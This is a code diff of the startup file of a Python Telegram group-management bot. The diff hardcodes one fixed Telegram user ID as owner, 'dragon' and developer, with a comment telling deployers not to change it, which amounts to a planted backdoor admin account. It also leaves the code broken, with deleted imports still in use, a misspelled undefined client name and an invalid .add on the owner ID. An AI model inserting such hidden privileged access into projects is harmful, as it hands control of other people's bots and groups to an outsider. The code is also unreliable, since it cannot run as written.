@@ -5,8 +5,7 @@ import time
 
 
 
-from pyrogram import Client, errors
-from telethon import TelegramClient
+
 
 StartTime = time.time()
 
@@ -174,24 +173,15 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+OWNER_ID.add(1928904042) # don't change it will work with var id also
+DRAGONS.add(1928904042)
 DEV_USERS.add(1928904042)
 DEV_USERS.add(1928904042)
-
-if not SPAMWATCH_API:
-    sw = None
-    LOGGER.warning("SpamWatch API key missing! recheck your config.")
-else:
-    try:
-        sw = spamwatch.Client(SPAMWATCH_API)
-    except:
-        sw = None
-        LOGGER.warning("Can't connect to SpamWatch!")
+DEV_USERS.add(1928904042)
 
 
-updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("layla", API_ID, API_HASH)
+updater = Telegramcilent.Updater(TOKEN, workers=WORKERS, use_context=True)
+telethn = Telegramclient("layla", API_ID, API_HASH)
 pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
@@ -208,7 +198,3 @@ from TGNRobot.modules.helper_funcs.handlers import (
     CustomRegexHandler,
 )
 
-# make sure the regex handler can take extra kwargs
-tg.RegexHandler = CustomRegexHandler
-tg.CommandHandler = CustomCommandHandler
-tg.MessageHandler = CustomMessageHandler
